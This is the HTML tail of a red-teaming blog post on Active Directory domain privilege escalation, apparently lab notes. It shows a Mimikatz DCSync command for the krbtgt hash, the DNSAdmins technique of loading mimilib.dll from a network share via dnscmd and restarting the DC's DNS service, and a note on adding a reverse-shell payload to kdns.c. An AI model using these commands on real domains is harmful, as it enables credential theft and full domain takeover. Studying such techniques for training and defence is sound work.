</span><span class="nx">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
</span></pre></table></code></div></div><h1 id="dns-admins"><span style="color:lightblue">DNS Admins</span></h1><ul><li>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).<li>In case the DC also serves as DNS, this will provide us escalation to DA. Need privileges to restart the DNS service.</ul><h2 id="methodologysteps-5"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. List all the DNS admins members<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Get a powershell session as that user using “Over pass the hash” since we shall already have the hash<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Load <strong>mimilib.dll</strong> using dnscmd<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Restart the dns of the DC<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Now all the DNS queries get stored at <strong>C:\Windows\System32\kiwidns.log</strong></ul><h2 id="rsat-dns"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">RSAT DNS</span></span><a href="#rsat-dns" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-from-the-privileges-of-dnsadmins-group-member-configure-dll-using-dnscmdexe"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe</span></span><a href="#1-from-the-privileges-of-dnsadmins-group-member-configure-dll-using-dnscmdexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dnscmd</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">/config</span><span class="w"> </span><span class="nx">/serverlevelplugindll</span><span class="w"> </span><span class="nx">\\172.16.50.100\d11\mimilib.dll</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-restart-the-dns-service"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Restart the DNS service</span></span><a href="#2-restart-the-dns-service" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">\\dcorp-dc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">dns</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">\\dcorp-dc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">dns</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-using-dnsserver-module"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Using DNSServer module</span></span><a href="#3-using-dnsserver-module" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$dnsettings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-DnsServerSetting</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-All</span><span class="w">
</span><span class="nv">$dnsettings</span><span class="o">.</span><span class="nf">ServerLevelPluginDll</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\172.16.50.100\d11\mimilib.d11"</span><span class="w">
</span><span class="n">Set-DnsServerSetting</span><span class="w"> </span><span class="nt">-Inputobject</span><span class="w"> </span><span class="nv">$dnsettings</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h2 id="custom-exploit-for-rev-shell"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Custom Exploit for Rev shell</span></span><a href="#custom-exploit-for-rev-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can edit the source code of <strong>kdns.c</strong> from <em>mikikatz</em> source code and add our own malicious payload using the <em>system()</em> function and get a reverse shell back to us.</p><h1 id="tools-used"><span style="color:lightblue">Tools Used</span></h1><ol><li>Invoke-Mimikatz download from here : <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a><li>PowerView download from here : <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">powerview.ps1</a><li>PowerView Dev download from here : <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">powerview.ps1</a><li>Invoke-UserHunter download from here : <a href="https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-UserHunter.ps1">Invoke-UserHunter.ps1</a><li>keko download from here : <a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20211214">keko</a><li>DnsCMD download from here : <a href="https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/">DnsCMD</a><li>tgsrepcrack.py download from here : <a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">tgsrepcrack.py</a><li>ASREPRoast download from here : <a href="https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1">ASREPRoast.ps1</a></ol><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red-Teaming</a>, <a href='/categories/active-directory-domain-privilege-escalation/'>Active-Directory-Domain-Privilege-Escalation</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/kerberost/" class="post-tag no-text-decoration" >kerberost</a> <a href="/tags/domain-privilege-escalation/" class="post-tag no-text-decoration" >domain-privilege-escalation</a> <a href="/tags/as-rep/" class="post-tag no-text-decoration" >AS-REP</a> <a href="/tags/set-spn/" class="post-tag no-text-decoration" >Set-SPN</a> <a href="/tags/unconstrained-delegation/" class="post-tag no-text-decoration" >unconstrained-delegation</a> <a href="/tags/constrained-delegation/" class="post-tag no-text-decoration" >constrained-delegation</a> <a href="/tags/delegation-abuse/" class="post-tag no-text-decoration" >delegation-abuse</a> <a href="/tags/dns-admin/" class="post-tag no-text-decoration" >dns-admin</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Active Directory - Domain Privilege Escalation - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/Active-Directory-Domain-Priv-Esc/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Active Directory - Domain Privilege Escalation - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/Active-Directory-Domain-Priv-Esc/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/Active-Directory-Domain-Priv-Esc/&amp;text=Active Directory - Domain Privilege Escalation - 0xStarlight" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Active-Directory-Introduction/"><div class="card-body"> <em class="timeago small" data-ts="1648537560" > 2022-03-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Introduction</h3><div class="text-muted small"><p> Introduction Welcome to my first article in the Red Teaming Series (Active Directory Introduction). I hope to provide you all with information for an initial foundation and motivation about Acti...</p></div></div></a></div><div class="card"> <a href="/posts/Offensive-powershell/"><div class="card-body"> <em class="timeago small" data-ts="1648612260" > 2022-03-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Offensive PowerShell</h3><div class="text-muted small"><p> Introduction Welcome to my second article in the Red Teaming Series (Offensive PowerShell). I hope everyone has gone through the first article of this series which explains the basic foundations...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Windows-Local-Priv-Esc/"><div class="card-body"> <em class="timeago small" data-ts="1648776360" > 2022-04-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Local Privilege Escalation</h3><div class="text-muted small"><p> Introduction Welcome to my third article in the Red Teaming Series (Active Directory Local Privilege Escalation). I hope everyone has gone through the first two articles of this series which go ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Active-Directory-Domain-Persistence/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory - Domain Persistence</p></a> <a href="/posts/Active-Diretory-Forest-Trust-Abuse/" class="btn btn-outline-primary" prompt="Newer"><p>Active Directory - Forest Trust Abuse</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
